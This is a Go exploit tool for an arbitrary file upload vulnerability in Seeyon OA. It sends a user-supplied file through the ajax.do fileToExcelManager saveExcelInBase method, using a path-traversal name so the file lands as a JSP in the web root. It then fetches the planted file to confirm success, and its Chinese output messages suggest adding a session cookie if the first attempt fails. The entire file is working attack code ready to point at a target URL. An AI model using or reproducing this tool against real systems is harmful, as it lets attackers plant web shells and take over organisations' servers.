package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	filenamePtr := flag.String("f", "", "file [Required]")
	cookiePtr := flag.String("c", "", "cookie [Optional]")
	hostPtr := flag.String("u", "", "target url [Required]")
	if len(os.Args) < 4 {
		flag.Usage()
		return
	}

	flag.Parse()

	rand.Seed(time.Now().UnixNano())
	randString := RandString(4)

	seeyonURL := fmt.Sprintf("%s/seeyon/ajax.do;JSESSIONID=46790A1177FA85708C322A141D758E2E", *hostPtr)
	jspURL := fmt.Sprintf("../webapps/ROOT/%s.jsp", randString)

	content, err := ioutil.ReadFile(*filenamePtr)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	encodedContent := unicodeEncode(string(content))

	requestBody := fmt.Sprintf("method=ajaxAction&managerName=fileToExcelManager&managerMethod=saveExcelInBase&arguments=[\"%s\",\"\",{\"columnName\":['%s']}]", jspURL, encodedContent)

	req1, err := http.NewRequest("POST", seeyonURL, strings.NewReader(requestBody))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req1.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 uacq")
	req1.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req1.Header.Set("Content-Length", fmt.Sprint(len(requestBody)))

	if *cookiePtr != "" {
		req1.Header.Set("Cookie", *cookiePtr)
	}

	// Create custom HTTP client with HTTPS support
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // Skip SSL certificate verification
	}
	client := &http.Client{Transport: tr}

	resp1, err := client.Do(req1)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp1.Body.Close()
	testurl := fmt.Sprintf("%s", *hostPtr)

	if resp1.StatusCode == http.StatusOK {
		fmt.Println(testurl, "可能存在致远OA_saveExcel任意文件上传漏洞")
	} else {
		fmt.Println(testurl, "不存在致远OA_saveExcel任意文件上传漏洞")
	}
	newurl := *hostPtr + "/" + randString + ".jsp"
	req2, err := http.NewRequest("GET", newurl, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	resp2, err := client.Do(req2)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp2.Body.Close()

	if resp2.StatusCode == http.StatusOK {
		fmt.Println("上传成功:", newurl)
	} else {
		fmt.Println("文件上传失败，可尝试添加cookie后台利用(JSESSIONID=5D188D3B....)")
	}
}

func RandString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func unicodeEncode(s string) string {
	var builder strings.Builder
	for _, r := range s {
		builder.WriteString(fmt.Sprintf("\\u%04X", r))
	}
	return builder.String()
}
